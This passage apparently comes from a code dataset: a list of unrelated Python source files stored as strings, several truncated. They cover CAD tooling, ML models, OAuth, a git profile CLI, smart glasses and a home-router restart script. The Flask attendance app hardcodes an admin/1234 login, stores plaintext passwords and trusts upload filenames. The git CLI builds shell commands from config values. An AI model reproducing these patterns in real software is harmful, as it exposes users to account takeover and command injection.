self.callback = self.view.addEventCallbackPivy(\n            coin.SoButtonEvent.getClassTypeId(), self.select_position)\n\n    def select_position(self, event):\n        \"\"\"\n        Select section views location\n        \"\"\"\n        # Get event\n        event = event.getEvent()\n\n        # If mouse left button pressed get picked point\n        if event.getTypeId().isDerivedFrom(coin.SoMouseButtonEvent.getClassTypeId()):\n            if event.getButton() == coin.SoMouseButtonEvent.BUTTON1 \\\n                and event.getState() == coin.SoMouseButtonEvent.DOWN:\n\n                # Finish event\n                self.view.removeEventCallbackPivy(\n                    coin.SoButtonEvent.getClassTypeId(), self.callback)\n\n                pos = event.getPosition().getValue()\n                position = self.view.getPoint(pos[0], pos[1])\n                position.z = 0\n\n                vol_group = self.selection[-1].getParentGroup()\n                region = vol_group.getParentGroup()\n\n                for item in region.Group:\n                    if item.Proxy.Type == 'Trails::Tables':\n                        tables = item\n                        break\n\n                tab = make_table.create(tables, position, self.selection[-1])\n\n                FreeCAD.ActiveDocument.recompute()\n\nFreeCADGui.addCommand('Create Table', CreateTable())\n",
    "from flask import Flask, render_template, request, redirect, url_for, session, flash\r\nimport sqlite3\r\nimport cv2\r\nimport face_recognition\r\nimport numpy as np\r\nimport pickle\r\nimport os\r\n\r\napp = Flask(__name__)\r\napp.secret_key = 'your_secret_key'\r\nDB_PATH = \"database.db\"\r\nUPLOAD_FOLDER = 'uploads'\r\nos.makedirs(UPLOAD_FOLDER, exist_ok=True)\r\n\r\ndef update_schema():\r\n    conn = sqlite3.connect(DB_PATH)\r\n    cursor = conn.cursor()\r\n\r\n    # Check and add missing columns\r\n    cursor.execute(\"PRAGMA table_info(students)\")\r\n    columns = [column[1] for column in cursor.fetchall()]\r\n\r\n    if \"absent\" not in columns:\r\n        cursor.execute(\"ALTER TABLE students ADD COLUMN absent INTEGER DEFAULT 0\")\r\n    \r\n    if \"status\" not in columns:\r\n        cursor.execute(\"ALTER TABLE students ADD COLUMN status TEXT DEFAULT 'Active'\")\r\n\r\n    conn.commit()\r\n    conn.close()\r\n\r\ndef init_db():\r\n    conn = sqlite3.connect(DB_PATH)\r\n    cursor = conn.cursor()\r\n\r\n    # Create users table\r\n    cursor.execute(\"\"\"\r\n    CREATE TABLE IF NOT EXISTS users (\r\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n        username TEXT UNIQUE NOT NULL,\r\n        password TEXT NOT NULL\r\n    )\r\n    \"\"\")\r\n\r\n    # Create students table with necessary columns\r\n    cursor.execute(\"\"\"\r\n        CREATE TABLE IF NOT EXISTS students (\r\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n            name TEXT NOT NULL,\r\n            warnings INTEGER DEFAULT 0,\r\n            absences INTEGER DEFAULT 0,\r\n            status TEXT DEFAULT 'Active'\r\n        )\r\n    \"\"\")\r\n\r\n    # Create face encodings table\r\n    cursor.execute(\"\"\"\r\n    CREATE TABLE IF NOT EXISTS face_encodings (\r\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n        student_id INTEGER,\r\n        encoding BLOB,\r\n        FOREIGN KEY(student_id) REFERENCES students(id)\r\n    )\r\n    \"\"\")\r\n\r\n    conn.commit()\r\n    conn.close()\r\n\r\n\r\n# Route: Home\r\n@app.route('/')\r\ndef index():\r\n    return render_template('index.html')\r\n\r\n# Route: Registration\r\n@app.route('/register', methods=['GET', 'POST'])\r\ndef register():\r\n    if request.method == 'POST':\r\n        username = request.form['username']\r\n        password = request.form['password']\r\n        conn = sqlite3.connect(DB_PATH)\r\n        cursor = conn.cursor()\r\n        try:\r\n            cursor.execute(\"INSERT INTO users (username, password) VALUES (?, ?)\", (username, password))\r\n            conn.commit()\r\n            flash('Registration successful! Please log in.', 'success')\r\n            return redirect(url_for('login'))\r\n        except sqlite3.IntegrityError:\r\n            flash('Username already exists. Please choose another.', 'danger')\r\n        finally:\r\n            conn.close()\r\n    return render_template('register.html')\r\n\r\n# Route: Login\r\n@app.route('/login', methods=['GET', 'POST'])\r\ndef login():\r\n    if request.method == 'POST':\r\n        username = request.form['username']\r\n        password = request.form['password']\r\n        if username == \"admin\" and password == \"1234\":\r\n            session['username'] = username\r\n            return redirect(url_for('admin_dashboard'))\r\n        else:\r\n            conn = sqlite3.connect(DB_PATH)\r\n            cursor = conn.cursor()\r\n            cursor.execute(\"SELECT * FROM users WHERE username=? AND password=?\", (username, password))\r\n            user = cursor.fetchone()\r\n            conn.close()\r\n            if user:\r\n                session['username'] = username\r\n                return redirect(url_for('user_dashboard'))\r\n            else:\r\n                flash('Invalid username or password. Please try again.', 'danger')\r\n    return render_template('login.html')\r\n\r\n# Route: Admin Dashboard\r\n@app.route('/admin_dashboard')\r\ndef admin_dashboard():\r\n    if 'username' in session and session['username'] == 'admin':\r\n        conn = sqlite3.connect(DB_PATH)\r\n        cursor = conn.cursor()\r\n        cursor.execute(\"SELECT * FROM students\")\r\n        students = cursor.fetchall()\r\n        conn.close()\r\n        return render_template('admin_dashboard.html', students=students)\r\n    return redirect(url_for('login'))\r\n\r\n# Route: User Dashboard\r\n@app.route('/user_dashboard')\r\ndef user_dashboard():\r\n    if 'username' in session:\r\n        return render_template('user_dashboard.html', username=session['username'])\r\n    return redirect(url_for('login'))\r\n\r\n# Route: Logout\r\n@app.route('/logout')\r\ndef logout():\r\n    session.pop('username', None)\r\n    flash('You have been logged out.', 'success')\r\n    return redirect(url_for('login'))\r\n\r\n# Route: Register Student with Face\r\n@app.route('/register_student', methods=['GET', 'POST'])\r\ndef register_student():\r\n    if 'username' in session and session['username'] == 'admin':\r\n        if request.method == 'POST':\r\n            name = request.form['name']\r\n            file = request.files['image']\r\n            if file:\r\n                image_path = os.path.join(UPLOAD_FOLDER, file.filename)\r\n                file.save(image_path)\r\n\r\n                # Encode face\r\n                image = face_recognition.load_ima",
    "from typing import Dict, Any\nimport requests\nfrom ..exceptions import SocialAuthError\nfrom .base import SocialProvider\n\nclass FacebookProvider(SocialProvider):\n    AUTH_URL = \"https://www.facebook.com/v18.0/dialog/oauth\"\n    TOKEN_URL = \"https://graph.facebook.com/v18.0/oauth/access_token\"\n    USER_INFO_URL = \"https://graph.facebook.com/v18.0/me\"\n\n    def get_auth_url(self) -> str:\n        params = {\n            'client_id': self.client_id,\n            'redirect_uri': self.redirect_uri,\n            'response_type': 'code',\n            'scope': 'email public_profile'\n        }\n        \n        query_string = '&'.join([f\"{key}={value}\" for key, value in params.items()])\n        return f\"{self.AUTH_URL}?{query_string}\"\n\n    def get_token(self, code: str) -> Dict[str, Any]:\n        data = {\n            'code': code,\n            'client_id': self.client_id,\n            'client_secret': self.client_secret,\n            'redirect_uri': self.redirect_uri\n        }\n\n        response = requests.get(self.TOKEN_URL, params=data)\n        \n        if response.status_code != 200:\n            raise SocialAuthError(f\"Failed to get token: {response.text}\")\n            \n        return response.json()\n\n    def get_user_info(self, access_token: str) -> Dict[str, Any]:\n        params = {\n            'fields': 'id,name,email,picture',\n            'access_token': access_token\n        }\n        \n        response = requests.get(self.USER_INFO_URL, params=params)\n        \n        if response.status_code != 200:\n            raise SocialAuthError(f\"Failed to get user info: {response.text}\")\n\n        user_data = response.json()\n        \n        return {\n            'provider': 'facebook',\n            'id': user_data.get('id'),\n            'email': user_data.get('email'),\n            'name': user_data.get('name'),\n            'avatar': user_data.get('picture', {}).get('data', {}).get('url'),\n            'raw': user_data\n        }",
    "import torch\nfrom dataclasses import dataclass\n\n\n@dataclass\nclass EventSimulatorConfig:\n    contrast_threshold_pos: float = 0.275\n    contrast_threshold_neg: float = 0.275\n    refractory_period: float = 1e-4\n\n\ndef events(\n    img: torch.Tensor,\n    time: float,\n    last_img: torch.Tensor,\n    last_time: float,\n    last_event_timestamp: torch.Tensor,\n    ref_values: torch.Tensor,\n    config: EventSimulatorConfig,\n):\n    delta = img - last_img\n    delta_t = time - last_time\n\n    pol = torch.where(delta >= 0.0, 1.0, -1.0)\n    contrast_threshold = torch.where(\n        pol > 0, config.contrast_threshold_pos, config.contrast_threshold_neg\n    )\n\n    active_mask = delta.abs() > 1e-6\n    events = []\n    curr_cross = ref_values.clone()\n    while True:\n        curr_cross[active_mask] += pol[active_mask] * contrast_threshold[active_mask]\n        pos_crossing = (pol > 0) & (curr_cross > last_img) & (curr_cross <= img)\n        neg_crossing = (pol < 0) & (curr_cross < last_img) & (curr_cross >= img)\n        crossing_conditions = pos_crossing | neg_crossing\n\n        active_mask &= crossing_conditions\n\n        if not active_mask.any():  # loop until no activations\n            break\n\n        ref_values[active_mask] = curr_cross[active_mask]\n\n        edt = torch.zeros_like(img)\n        edt[active_mask] = (\n            (curr_cross[active_mask] - last_img[active_mask])\n            * delta_t\n            / delta[active_mask]\n        )\n        t = last_time + edt\n\n        event_mask = (t - last_event_timestamp) >= config.refractory_period\n        event_mask |= last_event_timestamp == 0\n        event_mask &= active_mask\n        last_event_timestamp[event_mask] = t[event_mask]\n\n        indices = event_mask.argwhere()\n        ys, xs = indices[:, 0], indices[:, 1]\n        events.append(torch.column_stack((xs, ys, t[ys, xs], pol[ys, xs])))\n\n    if events:\n        events = torch.vstack(events)\n    else:\n        events = torch.empty((0, 4))\n    events = events[events[:, 2].argsort()]\n    return events\n\n\ndef events_generator(imgs, timestamps, config: EventSimulatorConfig):\n    it = iter(zip(imgs, timestamps))\n    last_img, last_time = next(it)\n    last_img = last_img.squeeze()\n\n    assert len(last_img.shape) == 2, \"expected single channel images of shape [h, w]\"\n\n    last_event_timestamp = torch.zeros_like(last_img)\n    ref_values = last_img.clone()\n\n    for img, time in it:\n        img = img.squeeze()\n        yield events(\n            img, time, last_img, last_time, last_event_timestamp, ref_values, config\n        )\n        last_img = img\n        last_time = time\n\n\ndef events_to_image(events, height: int, width: int):\n    img = torch.zeros((3, height, width), dtype=torch.float32)\n    xs = events[:, 0].long()\n    ys = events[:, 1].long()\n    pol = events[:, 3]\n    pos_mask = pol > 0\n    neg_mask = pol < 0\n    img[0, ys[pos_mask], xs[pos_mask]] = 1.0\n    img[2, ys[neg_mask], xs[neg_mask]] = 1.0\n    return img\n",
    "# coding=utf-8\n# Copyright 2022 EleutherAI and the HuggingFace Inc. team. All rights reserved.\n#\n# This code is based on EleutherAI's GPT-NeoX library and the GPT-NeoX\n# and OPT implementations in this library. It has been modified from its\n# original forms to accommodate minor architectural differences compared\n# to GPT-NeoX and OPT used by the Meta AI team that trained the model.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"LLaMA model configuration\"\"\"\n\nfrom transformers.configuration_utils import PretrainedConfig\nfrom transformers.modeling_rope_utils import rope_config_validation\n\n\nclass LlamaConfig(PretrainedConfig):\n    r\"\"\"\n    This is the configuration class to store the configuration of a [`LlamaModel`]. It is used to instantiate an LLaMA\n    model according to the specified arguments, defining the model architecture. Instantiating a configuration with the\n    defaults will yield a similar configuration to that of the LLaMA-7B.\n\n    Configuration objects inherit from [`PretrainedConfig`] and can be used to control the model outputs. Read the\n    documentation from [`PretrainedConfig`] for more information.\n\n\n    Args:\n        vocab_size (`int`, *optional*, defaults to 32000):\n            Vocabulary size of the LLaMA model. Defines the number of different tokens that can be represented by the\n            `inputs_ids` passed when calling [`LlamaModel`]\n        hidden_size (`int`, *optional*, defaults to 4096):\n            Dimension of the hidden representations.\n        intermediate_size (`int`, *optional*, defaults to 11008):\n            Dimension of the MLP representations.\n        num_hidden_layers (`int`, *optional*, defaults to 32):\n            Number of hidden layers in the Transformer decoder.\n        num_attention_heads (`int`, *optional*, defaults to 32):\n            Number of attention heads for each attention layer in the Transformer decoder.\n        num_key_value_heads (`int`, *optional*):\n            This is the number of key_value heads that should be used to implement Grouped Query Attention. If\n            `num_key_value_heads=num_attention_heads`, the model will use Multi Head Attention (MHA), if\n            `num_key_value_heads=1` the model will use Multi Query Attention (MQA) otherwise GQA is used. When\n            converting a multi-head checkpoint to a GQA checkpoint, each group key and value head should be constructed\n            by meanpooling all the original heads within that group. For more details checkout [this\n            paper](https://arxiv.org/pdf/2305.13245.pdf). If it is not specified, will default to\n            `num_attention_heads`.\n        hidden_act (`str` or `function`, *optional*, defaults to `\"silu\"`):\n            The non-linear activation function (function or string) in the decoder.\n        max_position_embeddings (`int`, *optional*, defaults to 2048):\n            The maximum sequence length that this model might ever be used with. Llama 1 supports up to 2048 tokens,\n            Llama 2 up to 4096, CodeLlama up to 16384.\n        initializer_range (`float`, *optional*, defaults to 0.02):\n            The standard deviation of the truncated_normal_initializer for initializing all weight matrices.\n        rms_norm_eps (`float`, *optional*, defaults to 1e-06):\n            The epsilon used by the rms normalization layers.\n        use_cache (`bool`, *optional*, defaults to `True`):\n            Whether or not the model should return the last key/values attentions (not used by all models). Only\n            relevant if `config.is_decoder=True`.\n        pad_token_id (`int`, *optional*):\n            Padding token id.\n        bos_token_id (`int`, *optional*, defaults to 1):\n            Beginning of stream token id.\n        eos_token_id (`int`, *optional*, defaults to 2):\n            End of stream token id.\n        pretraining_tp (`int`, *optional*, defaults to 1):\n            Experimental feature. Tensor parallelism rank used during pretraining. Please refer to [this\n            document](https://huggingface.co/docs/transformers/main/perf_train_gpu_many#tensor-parallelism) to\n            understand more about it. This value is necessary to ensure exact reproducibility of the pretraining\n            results. Please refer to [this issue](https://github.com/pytorch/pytorch/issues/76232).\n        tie_word_embeddings (`bool`, *optional*, defaults to `False`):\n            Whether to tie weight embeddings\n        rope_theta (`float`, *optional*, defaults to 10000.0):\n            The ",
    "import numpy as np\nimport pandas as pd\nimport tensorflow as tf\nfrom cnn import cnn\n\n#from RnnAttention.attention import attention\n\nfrom channelWiseAttention import  channel_wise_attention\nfrom DiSAN import directional_attention_with_dense, multi_dimensional_attention\n\nimport scipy.io\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.model_selection import StratifiedKFold\n\ndef calMinTimeStep(bulkArr):\n    keys = list(bulkArr.keys())\n    minTimeStep = len(bulkArr[keys[3]][0])\n\n    for i in range(4, len(keys)):\n        if minTimeStep > len(bulkArr[keys[i]][0]):\n            minTimeStep = len(bulkArr[keys[i]][0])\n\n    return minTimeStep\n\n\ndef preprocessingEEG(eegArr, minTimeStep):\n    res = eegArr[0][:minTimeStep].reshape(1, eegArr[0][:minTimeStep].shape[0])\n    for i in range(1, len(eegArr)):\n        res = np.append(res, eegArr[i][:minTimeStep].reshape(1, eegArr[i][:minTimeStep].shape[0]), axis=0)\n\n    return res\n\n# tensorflow \uacc4\uc0b0 \uad6c\uc870 -> \ubbf8\ub9ac \ub370\uc774\ud130\uac00 \ub4e4\uc5b4\uac08 \uc790\ub9ac\uc778 placeholder\ub9cc \ub9cc\ub4e4\uc5b4\ub193\uace0 layer \uc5f0\uc0b0 \uc815\uc758\ub97c \ud574\ub193\uc740\ub2e4\uc74c \uc774\ud6c4\uc5d0 feed_dict\ub97c \ud1b5\ud574 \ub370\uc774\ud130\ub97c placeholder\uc5d0 \uc8fc\uc785\n\n#the window length of EEG sample\nwindow_size = 30000 # \uc0d8\ud50c\ub9c1\uc8fc\ud30c\uc218 x \uce21\uc815\uc2dc\uac04 = 128hz x 3\ucd08 \ubd84\ub7c9\uc744 \ucd94\ucd9c/ SEED 1000hz x 3\ucd08\n# the channel of EEG sample, DEAP:32 DREAMER:14, SEED: 62\nn_channel = 62 # channel 62\uac1c \uc0ac\uc6a9 (SEED Dataset)\n\n\n\n###########################################################################\n# set model parameters\n###########################################################################\n# kernel parameter\nkernel_height_1st = 62 #DREAMER\uff1a14, \ucc44\ub110 \uc218\uc640 \uad00\ub828\nkernel_width_1st = 80 # cnn\uc774 \ud55c \ubc88\uc5d0 \ud559\uc2b5\ud558\ub294 \uc804\uc704\ub370\uc774\ud130 \ud3ec\uc778\ud2b8 \uac1c\uc218 \uc9e7\uc73c\uba74 \ubbf8\uc138\ud55c \ubcc0\ud654\uc5d0 \ubbfc\uac10, \uae38\uba74 \uc7a5\uae30\uc801 \ud328\ud134 \uac10\uc9c0\nkernel_stride = 1 # cnn \ud0d0\uc9c0\uac00 \ud55c \ubc88\uc5d0 \uc774\ub3d9\ud558\ub294 \uac70\ub9ac\nconv_channel_num = 40   # \uc774 \uac1c\uc218\ub9cc\ud07c \ud544\ud130\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc785\ub825\ub370\uc774\ud130\ub85c\ubd80\ud130 \uc774 \uac1c\uc218\ub9cc\ud07c\uc758 \ud2b9\uc9d5 \ub9f5\uc744 \ucd9c\ub825\n# pooling parameter\npooling_height_1st = 1      # pooling\uc5d0\uc11c \ucc44\ub110 \uc815\ubcf4\ub294 \uc720\uc9c0\npooling_width_1st = 75      # \uac12\uc774 \ud074\uc218\ub85d \ub354 \ub113\uace0 \ud3ec\uad04\uc801\uc778 \uc2dc\uac04 \ubc94\uc704\ub85c \ub370\uc774\ud130\ub97c \uc694\uc57d \uc5f0\uc0b0 -> \uc989, \uc5f0\uc0b0\ub7c9\uc774 \uc904\uc5b4\ub4e4\uc9c0\ub9cc \uc2dc\uac04 \ucd95\uc758 \ud574\uc0c1\ub3c4\ub3c4 \uc904\uc5b4\ub4e6\npooling_stride_1st = 10\n# full connected parameter\nattention_size = 512             # \ucd5c\uc801\uc758 \uac12 \ucc3e\uae30\nn_hidden_state = 128             # \ucd5c\uc801\uc758 \uac12 \ucc3e\uae30\n###########################################################################\n# input channel\ninput_channel_num = 1            # 1\ub85c \uc124\uc815\n# input height\ninput_height = 62 #DREAMER\uff1a14, channel \uc218\n# input width\ninput_width = 30000\n# prediction class\nnum_labels = 3   # -1: negative, 0: neutral, 1: positive\n###########################################################################\n# set training parameters\n###########################################################################\n# step length\nnum_timestep = 1\n# set learning rate\nlearning_rate = 1e-4\n# set maximum traing epochs\ntraining_epochs = 200\n# set batch size\n#batch_size = -1\n# set dropout probability\ndropout_prob = 0.5\n# instance cnn class\npadding = 'VALID'\ncnn_2d = cnn(padding=padding)\n\n################################## The ACRNN Model #########################################\n# input placeholder\n\ntf.compat.v1.disable_eager_execution()\n\nX = tf.compat.v1.placeholder(tf.float32, shape=[None, input_height, input_width, input_channel_num], name = 'X')\nY = tf.compat.v1.placeholder(tf.float32, shape=[None, num_labels], name = 'Y')\ntrain_phase = tf.compat.v1.placeholder(tf.bool, name = 'train_phase')\nkeep_prob = tf.compat.v1.placeholder(tf.float32, name='keep_prob')\n\n# channel-wise attention layer\nX_1 = tf.transpose(X,[0, 3, 2, 1])\n\nconv = channel_wise_attention(X_1, 1, window_size, n_channel, weight_decay=0.00004, scope='', reuse=None)\n\nconv_1 = tf.transpose(conv,[0, 3, 2, 1])\n\nprint(conv_1.shape)\n\n# CNN layer: \ud55c \uce35\ub9cc \uc0ac\uc6a9 (\ub2e4\uce35\uc73c\ub85c \uc0ac\uc6a9\ud574\ubcfc \uc218 \uc788\uc9c0 \uc54a\uc744\uae4c????)\nconv_1 = cnn_2d.apply_conv2d(conv_1, kernel_height_1st, kernel_width_1st, input_channel_num, conv_channel_num, kernel_stride, train_phase)\nprint(\"conv 1 shape: \", conv_1.get_shape().as_list())\npool_1 = cnn_2d.apply_max_pooling(conv_1, pooling_height_1st, pooling_width_1st, pooling_stride_1st)\nprint(\"pool 1 shape: \", pool_1.get_shape().as_list())\npool_1_shape = pool_1.get_shape().as_list()\npool1_flat = tf.reshape(pool_1, [-1, pool_1_shape[1]*pool_1_shape[2]*pool_1_shape[3]])   #\ud480\ub9c1\ub41c \ud2b9\uc9d5 \ub9f5\uc744 1D \ubca1\ud130\ub85c \ubcc0\ud658\nfc_drop = tf.nn.dropout(pool1_flat, keep_prob)   # \uacfc\uc801\ud569 \ubc29\uc9c0\n\n# LSTMs layer: cnn layer\uc758 \ucd9c\ub825\uc744 LSTM layer\uc5d0 \uc785\ub825\ud574 \uc2dc\uacc4\uc5f4 \ub370\uc774\ud130\uc758 \uc2dc\uac04\uc801 \ud328\ud134\uc744 \ud559\uc2b5\nlstm_in = tf.reshape(fc_drop, [-1, num_timestep, pool_1_shape[1]*pool_1_shape[2]*pool_1_shape[3]])\ncells = []\nfor _ in range(2): # \ucd1d 2\uac1c\uc758 LSTM cell\uc744 \uc0dd\uc131\n   cell = tf.compat.v1.nn.rnn_cell.BasicLSTMCell(n_hidden_state, forget_bias=1.0, state_is_tuple=True)   # LSTM cell \ud615\uc131\n   cell = tf.compat.v1.nn.rnn_cell.DropoutWrapper(cell, output_keep_prob=keep_prob)  # \uacfc\uc801\ud569 \ubc29\uc9c0\n   cells.append(cell)\n\n\nlstm_cell = tf.compat.v1.nn.rnn_cell.MultiRNNCell(cells)   # \ub2e4\uce35 LSTM \uad6c\uc870 \uc0dd\uc131\n\nbatch_size = tf.shape(X)[0]\ninit_state = lstm_cell.zero_state(batch_size, dtype=tf.float32) # \ub2e4\uce35 LSTM \uad6c\uc870 \ucd08\uae30 \uc0c1\ud0dc \ud615\uc131\n\n# output (run_op) ==> [batch, step, n_hidden_state]\n# states: \uac01 LSTM \uc140\uc758 \ucd5c\uc885 \uc740\ub2c9\uce35 \uc0c1\ud0dc\uc640 \uc140 \uc0c1\ud0dc\ub97c \ud3ec\ud568\nrnn_op, states = tf.compat.v1.nn.dynamic_rnn(lstm_cell, lstm_in, initial_state=init_state, time_major=False) # LSTM \uad6c\uc870\uc5d0 CNN input \ub123\uace0 \ucd9c\ub825\n\n#self-attention layer\nwith tf.name_scope('A",
    "\"\"\"Simple cli for managing multiple git profiles/configs\"\"\"\n# pylint: disable=missing-function-docstring, missing-class-docstring, import-error\nimport argparse\nimport os\nimport sys\n\nimport yaml\n\n\nclass GPM:\n\n    class ConfigError(Exception):\n        def __init__(self, message):\n            super().__init__(message)\n\n    def __init__(self):\n        self.config_file = os.path.expanduser(\"~/.gpm/config.yaml\")\n        self.sample_config = {\n                'profiles': {\n                    'default': {\n                        'username': 'your_username',\n                        'email': 'your_email@example.com'\n                    }\n                }\n            }\n\n        self.init_parser()\n\n    def init_parser(self):\n        self.parser = argparse.ArgumentParser(\n                    prog='Git Profile Manager',\n                    description='Managing multiple git profiles with ease')\n\n        self.parser.add_argument('action', help='', choices=['get', 'set', 'edit', 'list'])\n\n        self.parser.add_argument('profile', nargs='?', choices=[profile[0] for profile in self.get_profiles()])\n\n    def read_config(self):\n        if not os.path.exists(self.config_file):\n            os.makedirs(os.path.dirname(self.config_file), exist_ok=True)\n            with open(self.config_file, 'w', encoding=\"utf-8\") as config:\n                yaml.dump(self.sample_config, config)\n\n        with open(self.config_file, encoding=\"utf-8\") as config:\n            try:\n                return yaml.safe_load(config)\n            except yaml.YAMLError as exc:\n                raise self.ConfigError(f\"Failed to parse configuration file: {exc}\")\n\n    def get_profiles(self):\n        profiles = []\n        for profile_name, profile in self.read_config()[\"profiles\"].items():\n            profiles.append((profile_name, profile))\n\n        return profiles\n\n    def print_profiles(self):\n        for profile in self.get_profiles():\n            print(f'{profile[0]}:')\n            print(f'    {profile[1][\"email\"]}')\n            print(f'    {profile[1][\"username\"]}\\n')\n\n    def get_current_profile(self):\n        print(\"Your current active profile:\")\n        print(f'Username:   {os.popen(\"git config user.name\").read().rstrip()}')\n        print(f'Email:      {os.popen(\"git config user.email\").read().rstrip()}\\n')\n\n    def match_profile(self, profile_name):\n        for profile in self.get_profiles():\n            if profile[0] == profile_name:\n                print(f'Setting profile {profile[0]}')\n                return profile\n        print(f'No matching profile found for {profile_name}')\n        return None\n\n    def set_profile(self, profile):\n        profile = self.match_profile(profile)\n        os.system(f'git config user.name {profile[1][\"username\"]}')\n        os.system(f'git config user.email {profile[1][\"email\"]}')\n\n\ndef main():\n    gpm = GPM()\n\n    if len(sys.argv) == 1:\n        gpm.get_current_profile()\n        gpm.parser.print_help()\n        return\n\n    args = gpm.parser.parse_args()\n\n    if args.action == 'get':\n        gpm.get_current_profile()\n    elif args.action == 'set':\n        if args.profile:\n            gpm.set_profile(args.profile)\n        else:\n            print(\"Error: Profile name is required for 'set' action\")\n    elif args.action == 'edit':\n        os.system(f'vi {gpm.config_file}')\n    elif args.action == 'list':\n        gpm.print_profiles()\n\nif __name__ == \"__main__\":\n    main()\n",
    "\"\"\"\nDevice management service for G1 glasses\nif battery status is available, add that here too\n\"\"\"\n\nfrom utils.constants import COMMANDS, EventCategories\n\nclass DeviceManager:\n    \"\"\"Handles device-wide states and controls\"\"\"\n    \n    def __init__(self, connector):\n        self.connector = connector\n        self.logger = connector.logger\n        self._silent_mode = False\n        self._battery_level = {\n            'left': None,\n            'right': None\n        }\n    \n    @property\n    def silent_mode(self) -> bool:\n        \"\"\"Get current silent mode state\"\"\"\n        return self._silent_mode\n    \n    async def set_silent_mode(self, enabled: bool) -> bool:\n        \"\"\"Set silent mode state (disables all functionality)\"\"\"\n        try:\n            if enabled == self._silent_mode:\n                return True\n                \n            # Command structure for silent mode\n            command = bytes([COMMANDS.DASHBOARD_OPEN, 0x01 if enabled else 0x00])\n            \n            result = await self.connector.command_manager.send_command(\n                self.connector.right_client,\n                command,\n                expect_response=True\n            )\n            \n            if result and result[1] == EventCategories.COMMAND_RESPONSE:\n                self._silent_mode = enabled\n                self.logger.info(f\"Silent mode {'enabled' if enabled else 'disabled'}\")\n                await self.connector.update_status()\n                return True\n            \n            self.logger.warning(f\"Failed to set silent mode: unexpected response {result[1] if result else 'None'}\")\n            return False\n            \n        except Exception as e:\n            self.logger.error(f\"Error setting silent mode: {e}\")\n            return False\n\n    @property\n    def battery_level(self) -> dict:\n        \"\"\"Get current battery levels\"\"\"\n        return self._battery_level.copy()\n\n    def update_battery_level(self, side: str, level: int):\n        \"\"\"Update battery level for specified side\"\"\"\n        if side in self._battery_level:\n            self._battery_level[side] = level\n            self.logger.debug(f\"Battery level updated for {side}: {level}%\") ",
    "import time\nfrom bs4 import BeautifulSoup\nimport requests\nimport hashlib\nimport re\nimport os\n\ndef get_token_from_xml(session):\n    url = \"http://192.168.1.1/function_module/login_module/login_page/logintoken_lua.lua\"  # Token URL'si\n    response = session.get(url)\n\n    if response.status_code == 200:\n        # Yan\u0131t i\u00e7eri\u011fini al\n        xml_content = response.text\n        \n        # <ajax_response_xml_root>...</ajax_response_xml_root> i\u00e7eri\u011fini \u00e7\u0131kar\n        token_pattern = r\"<ajax_response_xml_root>(\\d+)</ajax_response_xml_root>\"\n        match = re.search(token_pattern, xml_content)\n        \n        if match:\n            token = match.group(1)\n            print(\"Token al\u0131nd\u0131:\", token)\n            return token\n        else:\n            print(\"Token bulunamad\u0131!\")\n            return None\n    else:\n        print(\"Token al\u0131namad\u0131! Hata kodu:\", response.status_code)\n        return None\n    \ndef get_site(url):\n    return requests.get(url)\n\ndef get_session_token(response):\n    if response.status_code == 200:\n        # Sayfa i\u00e7eri\u011fini al\n        html_content = response.text\n        \n        # \"_sessionTOKEN\", \"de\u011fer\" format\u0131nda arama\n        token_pattern = r'\"_sessionTOKEN\",\\s*\"(\\d+)\"'\n        match = re.search(token_pattern, html_content)\n        \n        if match:\n            session_token = match.group(1)\n            print(\"Session Token al\u0131nd\u0131:\", session_token)\n            return session_token\n        else:\n            print(\"Session Token bulunamad\u0131!\")\n            return None\n    else:\n        print(\"Session Token al\u0131namad\u0131! Hata kodu:\", response.status_code)\n        return None\n\ndef calculate_password(password, token):\n    combined = password + token  # \u015eifre ve token birle\u015ftiriliyor\n    sha256_hash = hashlib.sha256(combined.encode()).hexdigest()  # SHA256 hash hesaplama\n    return sha256_hash\n\n\nsession = requests.session()\nlogin_url = \"http://192.168.1.1/\"\nresponse = session.get(login_url)\n\n_sessionToken = get_session_token(response)\n\nlogin_payload = {\n   \"Username\": \"admin\",\n    \"Password\": calculate_password(\"PASSWORDHERE\",get_token_from_xml(session)),\n    \"action\": \"login\",\n    \"_sessionTOKEN\": _sessionToken\n}\n\nlogin_response = session.post(\"http://192.168.1.1/\", data=login_payload)\n\nif login_response.status_code == 200:\n    print(\"Login ba\u015far\u0131l\u0131!\")\n\nelse:\n    print(\"Login ba\u015far\u0131s\u0131z! Hata kodu:\", login_response.status_code)\n    print(\"Hata mesaj\u0131:\", login_response.text)\n    \ndef extract_session_token(response):\n    if response.status_code == 200:\n        html_content = response.text\n        token_pattern = r'_sessionTmpToken = \"([^\"]+)\"'\n        match = re.search(token_pattern, html_content)\n        \n        if match:\n            token = match.group(1)\n            token = bytes(token, \"utf-8\").decode(\"unicode_escape\")\n            print(\"Extracted session token:\", token)\n            return token\n        else:\n            print(\"Session token not found!\")\n            return None\n    else:\n        print(\"Failed to extract session token! Status code:\", response.status_code)\n        return None\n    \ntmpToken = extract_session_token(login_response)\n\nprint(\"tmp:\",tmpToken)\n\n\n# http://192.168.1.1/getpage.lua?pid=123&nextpage=ManagDiag_DeviceManag_t.lp&Menu3Location=0&_=1735754423590 \n# bu linkteki $('#template_RestartManag')'i \n# template = $('#template_RestartManag')\n# \u00c7ALI\u015eTI: dataPost(\"Restart\", \"fillDataByRestartResult\", \"/common_page/deviceManag_lua.lua\", template, undefined, false);\n# buraya yolla\n\n\n\nsession.get(\"http://192.168.1.1/getpage.lua?pid=123&nextpage=ManagDiag_StatusManag_t.lp&Menu3Location=0\")\n\n\nresp = session.get(\"http://192.168.1.1/getpage.lua?pid=123&nextpage=ManagDiag_DeviceManag_t.lp&Menu3Location=0\")\n\n\nif resp.status_code == 200:\n    print(\"Page succesfully retrieved!\")\nelse:\n    print(\"Failed to retrieve the page! Status code:\", resp.status_code)\n    print(\"Error message:\", resp.text)\n\n\n\n# # Extract the template from the response\n# soup = BeautifulSoup(resp.text, 